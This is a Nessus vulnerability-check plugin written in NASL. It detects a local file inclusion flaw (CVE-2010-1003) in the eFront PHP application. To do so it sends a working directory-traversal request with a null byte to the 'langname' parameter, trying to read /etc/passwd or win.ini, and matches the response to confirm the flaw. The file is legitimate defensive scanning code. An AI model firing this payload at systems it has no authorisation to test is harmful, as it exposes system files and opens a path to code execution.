#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(45120);
  script_version("$Revision: 1.11 $");
 script_cvs_date("$Date: 2016/10/10 15:57:05 $");

  script_cve_id("CVE-2010-1003");
  script_bugtraq_id(38787);
  script_osvdb_id(63028);

  script_name(english:"eFront 'langname' Parameter Traversal Local File Inclusion");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"A PHP application running on the remote web server is affected by a
local file inclusion vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of eFront running on the remote web server is affected by
a local file inclusion vulnerability due to improper sanitization of
user-supplied input to the 'langname' parameter of the language.php
script before using it to include PHP code.

Regardless of PHP's 'register_globals' setting, an unauthenticated,
remote attacker can exploit the issue to view arbitrary files or to
execute arbitrary PHP code on the remote host, subject to the
privileges of the web server user id.");
  script_set_attribute(attribute:"see_also", value:"http://www.coresecurity.com/content/efront-php-file-inclusion");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2010/Mar/155");
  script_set_attribute(attribute:"see_also", value:"http://old.efrontlearning.net/download/download-efront.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to eFront 3.5.5 Build 6301 or later. Alternatively, apply the
patch referenced in the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"eFront 3.5.5 LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/03/16");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/03/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/03/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:efrontlearning:efront");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("efront_detect.nbin", "os_fingerprint.nasl");
  script_require_keys("www/PHP", "installed_sw/eFront");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "eFront";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";

traversal = crap(data:"../", length:3*9) + '..';

# Loop through files to look for.
foreach file (files)
{
  # Try to exploit the issue.
  url = '/editor/tiny_mce/langs/language.php?' +
    'langname=a/' + traversal + file + '%00';

  res = http_send_recv3(port:port, method:"GET", item:dir+url, exit_on_fail:TRUE);

  # There's a problem if...
  body = res[2];
  file_pat = file_pats[file];
  if (
    !isnull(body) &&
    (
      # we see the expected contents or...
      egrep(pattern:file_pat, string:body) ||
      # we get an error because magic_quotes was enabled or...
      traversal+file+"\0.php.inc" >< body ||
      # we get an error claiming the file doesn't exist or...
      traversal+file+"): failed to open stream: No such file" >< body ||
      traversal+file+") [function.include-once]: failed to open stream: No such file" >< body ||
      traversal+file+") [<a href='function.include-once'>function.include-once</a>]: failed to open stream: No such file" >< body ||
      # we get an error about open_basedir restriction.
      traversal+file+") [function.include_once]: failed to open stream: Operation not permitted" >< body ||
      traversal+file+") [<a href='function.include-once'>function.include-once</a>]: failed to open stream: Operation not permitted" >< body ||
      "open_basedir restriction in effect. File("+traversal+file >< body
    )
  )
  {
    vuln = TRUE;
    output = NULL;
    errors = FALSE;

    if (egrep(pattern:file_pat, string:body))
    {
      pos = stridx(body, "<b");
      if (pos > 0 && !empty_or_null(pos))
      {
        output = substr(body, 0, (pos - 1));
        if (empty_or_null(output)) output = chomp(body);
      }
      else output = chomp(body);
      break;
    }
    else
    {
      errors = TRUE;
      break;
    }
  }
}
if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

if (errors)
{
  if (report_verbosity > 0)
  {
    report =
      '\nNessus was not able to exploit the issue, but was able to verify'+
      ' it' + '\nexists by examining the error message returned from the' +
      ' following' + '\nrequest :' +
      '\n' +
      '\n' + install_url + url +
      '\n';
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    file        : file,
    request     : make_list(install_url + url),
    output      : chomp(output),
    attach_type : 'text/plain'
  );
  exit(0);
}
